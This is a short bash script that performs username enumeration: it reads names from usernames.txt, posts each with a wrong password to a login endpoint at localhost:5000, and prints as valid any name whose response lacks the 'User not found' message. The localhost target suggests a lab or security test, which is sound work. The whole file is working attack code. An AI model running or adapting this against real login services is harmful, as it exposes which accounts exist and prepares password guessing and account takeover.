#!/bin/bash
while IFS= read -r user; do
    response=$(curl -s -X POST http://localhost:5000/login \
        -d "username=${user}&password=test_wrong_password")
    
    if [[ ! "$response" =~ "User not found" ]]; then
        echo "[VALID] $user"
    fi
done < usernames.txt
